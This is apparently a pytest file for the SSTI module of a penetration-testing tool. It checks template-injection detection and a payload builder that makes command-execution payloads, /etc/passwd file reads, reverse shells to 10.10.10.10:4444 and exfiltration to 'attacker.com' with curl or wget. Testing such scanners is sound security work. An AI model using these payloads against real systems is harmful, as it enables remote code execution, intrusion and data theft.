"""Tests for SSTI module"""

import pytest
from unittest.mock import AsyncMock, Mock, patch
from app.modules.ssti import (
    SSTITester,
    SSTIPayloadBuilder,
    InjectionPoint,
    SSTIResult,
    TemplateEngine,
    SSTIType,
)
from app.core.request_handler import Response


@pytest.fixture
def mock_request_handler():
    """Create mock request handler"""
    handler = Mock()
    handler.send_request = AsyncMock()
    return handler


@pytest.fixture
def mock_oob_listener():
    """Create mock OOB listener"""
    listener = Mock()
    listener.generate_unique_id = Mock(return_value="test-id-12345")
    listener.get_callback_url = Mock(return_value="http://oob.example.com/test-id-12345")
    listener.get_dns_callback = Mock(return_value="test-id-12345.oob.example.com")
    listener.register_payload = AsyncMock()
    listener.wait_for_callback = AsyncMock(return_value=None)
    return listener


@pytest.fixture
def sample_injection_point():
    """Create sample injection point"""
    return InjectionPoint(
        parameter="name",
        location="query",
        original_value="test",
        url="https://example.com/greet",
        method="GET",
    )


class TestSSTITester:
    """Tests for SSTITester class"""
    
    @pytest.mark.asyncio
    async def test_direct_ssti_jinja2_detection(self, mock_request_handler, sample_injection_point):
        """Test direct SSTI detection for Jinja2"""
        # Setup mock responses
        baseline_response = Mock(spec=Response)
        baseline_response.text = "Hello test"
        baseline_response.status_code = 200
        
        vulnerable_response = Mock(spec=Response)
        vulnerable_response.text = "Hello 49"  # {{7*7}} = 49
        vulnerable_response.status_code = 200
        
        # Return baseline for all other requests
        default_response = Mock(spec=Response)
        default_response.text = "Hello test"
        default_response.status_code = 200
        
        # Create a generator that returns responses
        responses = [baseline_response, vulnerable_response]
        responses.extend([default_response] * 50)  # Add many default responses
        
        mock_request_handler.send_request.side_effect = responses
        
        # Test
        tester = SSTITester(mock_request_handler)
        results = await tester.test_injection_point(
            sample_injection_point,
            techniques=[SSTIType.DIRECT]
        )
        
        # Verify
        assert len(results) > 0
        result = results[0]
        if result.is_vulnerable:
            assert result.template_engine == TemplateEngine.JINJA2
            assert result.ssti_type == SSTIType.DIRECT
            assert result.confidence > 0.8
    
    @pytest.mark.asyncio
    async def test_direct_ssti_twig_detection(self, mock_request_handler, sample_injection_point):
        """Test direct SSTI detection for Twig"""
        # Setup mock responses
        baseline_response = Mock(spec=Response)
        baseline_response.text = "Hello test"
        
        vulnerable_response = Mock(spec=Response)
        vulnerable_response.text = "Hello 7777777"  # {{7*'7'}} = 7777777
        
        # Return baseline for all other requests
        default_response = Mock(spec=Response)
        default_response.text = "Hello test"
        default_response.status_code = 200
        
        # Create a generator that returns responses
        responses = [baseline_response, vulnerable_response]
        responses.extend([default_response] * 50)  # Add many default responses
        
        mock_request_handler.send_request.side_effect = responses
        
        # Test
        tester = SSTITester(mock_request_handler)
        results = await tester.test_injection_point(
            sample_injection_point,
            techniques=[SSTIType.DIRECT]
        )
        
        # Verify
        assert len(results) > 0
        result = results[0]
        if result.is_vulnerable:
            assert result.template_engine in [TemplateEngine.JINJA2, TemplateEngine.TWIG]
            assert result.ssti_type == SSTIType.DIRECT
    
    @pytest.mark.asyncio
    async def test_error_based_ssti_detection(self, mock_request_handler, sample_injection_point):
        """Test error-based SSTI detection"""
        # Setup mock responses
        baseline_response = Mock(spec=Response)
        baseline_response.text = "Hello test"
        
        error_response = Mock(spec=Response)
        error_response.text = "jinja2.exceptions.TemplateSyntaxError: unexpected '}'"
        
        mock_request_handler.send_request.side_effect = [
            baseline_response,
            error_response,
        ]
        
        # Test
        tester = SSTITester(mock_request_handler)
        results = await tester.test_injection_point(
            sample_injection_point,
            techniques=[SSTIType.ERROR_BASED]
        )
        
        # Verify
        assert len(results) > 0
        result = results[0]
        if result.is_vulnerable:
            assert result.template_engine == TemplateEngine.JINJA2
            assert result.ssti_type == SSTIType.ERROR_BASED
            assert result.confidence > 0.7
    
    @pytest.mark.asyncio
    async def test_blind_oob_ssti_detection(self, mock_request_handler, mock_oob_listener, sample_injection_point):
        """Test blind SSTI with OOB detection"""
        # Setup mock responses
        response = Mock(spec=Response)
        response.text = "Hello test"
        response.status_code = 200
        
        mock_request_handler.send_request.return_value = response
        
        # Setup OOB callback
        callback = Mock()
        callback.callback_id = "callback-123"
        callback.callback_type = "http"
        callback.source_ip = "192.168.1.100"
        callback.timestamp = Mock()
        callback.timestamp.isoformat = Mock(return_value="2024-01-01T00:00:00")
        callback.data = {}
        
        mock_oob_listener.wait_for_callback.return_value = callback
        
        # Test
        tester = SSTITester(mock_request_handler, oob_listener=mock_oob_listener)
        results = await tester.test_injection_point(
            sample_injection_point,
            techniques=[SSTIType.BLIND_OOB]
        )
        
        # Verify
        assert len(results) > 0
        result = results[0]
        if result.is_vulnerable:
            assert result.ssti_type == SSTIType.BLIND_OOB
            assert result.oob_callback_id == "callback-123"
            assert result.confidence > 0.9
    
    @pytest.mark.asyncio
    async def test_no_vulnerability_found(self, mock_request_handler, sample_injection_point):
        """Test when no SSTI vulnerability is found"""
        # Setup mock responses - all return same baseline
        baseline_response = Mock(spec=Response)
        baseline_response.text = "Hello test"
        baseline_response.status_code = 200
        
        mock_request_handler.send_request.return_value = baseline_response
        
        # Test
        tester = SSTITester(mock_request_handler)
        results = await tester.test_injection_point(
            sample_injection_point,
            techniques=[SSTIType.DIRECT]
        )
        
        # Verify
        assert len(results) > 0
        result = results[0]
        assert result.is_vulnerable == False
        assert result.confidence == 0.0
    
    @pytest.mark.asyncio
    async def test_rce_payload_execution(self, mock_request_handler, sample_injection_point):
        """Test RCE payload execution after engine detection"""
        # Setup mock responses
        baseline_response = Mock(spec=Response)
        baseline_response.text = "Hello test"
        
        detection_response = Mock(spec=Response)
        detection_response.text = "Hello 49"  # {{7*7}} = 49
        
        rce_response = Mock(spec=Response)
        rce_response.text = "uid=1000(user) gid=1000(user)"  # id command output
        
        mock_request_handler.send_request.side_effect = [
            baseline_response,
            detection_response,
            rce_response,
        ]
        
        # Test
        tester = SSTITester(mock_request_handler)
        results = await tester.test_injection_point(
            sample_injection_point,
            techniques=[SSTIType.DIRECT]
        )
        
        # Verify
        assert len(results) > 0
        result = results[0]
        if result.is_vulnerable and "uid=" in result.output:
            assert result.confidence >= 0.95  # Higher confidence for RCE
            assert "RCE" in str(result.evidence)


class TestSSTIPayloadBuilder:
    """Tests for SSTIPayloadBuilder class"""
    
    def test_build_command_payload_jinja2(self):
        """Test building command payload for Jinja2"""
        builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)
        payloads = builder.build_command_payload("whoami")
        
        assert len(payloads) > 0
        assert all("whoami" in payload for payload in payloads)
        assert any("os.popen" in payload for payload in payloads)
    
    def test_build_command_payload_twig(self):
        """Test building command payload for Twig"""
        builder = SSTIPayloadBuilder(TemplateEngine.TWIG)
        payloads = builder.build_command_payload("id")
        
        assert len(payloads) > 0
        assert all("id" in payload for payload in payloads)
        assert any("registerUndefinedFilterCallback" in payload for payload in payloads)
    
    def test_build_file_read_payload(self):
        """Test building file read payload"""
        builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)
        payloads = builder.build_file_read_payload("/etc/passwd")
        
        assert len(payloads) > 0
        assert all("/etc/passwd" in payload or "cat /etc/passwd" in payload for payload in payloads)
    
    def test_build_reverse_shell_payload(self):
        """Test building reverse shell payload"""
        builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)
        payloads = builder.build_reverse_shell_payload("10.10.10.10", 4444)
        
        assert len(payloads) > 0
        assert any("10.10.10.10" in payload and "4444" in payload for payload in payloads)
        assert any("bash" in payload or "python" in payload or "nc" in payload for payload in payloads)
    
    def test_build_data_exfiltration_payload(self):
        """Test building data exfiltration payload"""
        builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)
        payloads = builder.build_data_exfiltration_payload(
            "/etc/passwd",
            "http://attacker.com/exfil"
        )
        
        assert len(payloads) > 0
        assert any("/etc/passwd" in payload and "attacker.com" in payload for payload in payloads)
        assert any("curl" in payload or "wget" in payload for payload in payloads)
    
    def test_get_available_templates(self):
        """Test getting available templates"""
        builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)
        templates = builder.get_available_templates()
        
        assert len(templates) > 0
        assert all(isinstance(template, str) for template in templates)
        assert any("COMMAND" in template for template in templates)
    
    def test_customize_template(self):
        """Test customizing a template"""
        builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)
        custom_payload = builder.customize_template(
            template_index=0,
            replacements={"COMMAND": "cat /flag.txt"}
        )
        
        assert "cat /flag.txt" in custom_payload
        assert "COMMAND" not in custom_payload
    
    def test_customize_template_invalid_index(self):
        """Test customizing template with invalid index"""
        builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)
        
        with pytest.raises(ValueError):
            builder.customize_template(
                template_index=999,
                replacements={"COMMAND": "test"}
            )
    
    def test_unsupported_engine(self):
        """Test builder with unsupported engine"""
        builder = SSTIPayloadBuilder(TemplateEngine.UNKNOWN)
        payloads = builder.build_command_payload("whoami")
        
        # Should return empty list for unknown engine
        assert len(payloads) == 0


class TestInjectionPoint:
    """Tests for InjectionPoint dataclass"""
    
    def test_injection_point_creation(self):
        """Test creating an injection point"""
        point = InjectionPoint(
            parameter="test",
            location="query",
            original_value="value",
            url="https://example.com",
            method="GET",
        )
        
        assert point.parameter == "test"
        assert point.location == "query"
        assert point.original_value == "value"
        assert point.url == "https://example.com"
        assert point.method == "GET"
    
    def test_injection_point_with_data(self):
        """Test injection point with POST data"""
        point = InjectionPoint(
            parameter="username",
            location="post",
            original_value="admin",
            url="https://example.com/login",
            method="POST",
            data={"username": "admin", "password": "pass"},
        )
        
        assert point.data is not None
        assert "username" in point.data
        assert "password" in point.data


class TestSSTIResult:
    """Tests for SSTIResult dataclass"""
    
    def test_ssti_result_creation(self):
        """Test creating an SSTI result"""
        point = InjectionPoint(
            parameter="test",
            location="query",
            original_value="value",
            url="https://example.com",
        )
        
        result = SSTIResult(
            injection_point=point,
            is_vulnerable=True,
            ssti_type=SSTIType.DIRECT,
            template_engine=TemplateEngine.JINJA2,
            payload="{{7*7}}",
            confidence=0.95,
            output="49",
            evidence=["Template engine detected", "RCE successful"],
        )
        
        assert result.is_vulnerable == True
        assert result.ssti_type == SSTIType.DIRECT
        assert result.template_engine == TemplateEngine.JINJA2
        assert result.confidence == 0.95
        assert len(result.evidence) == 2
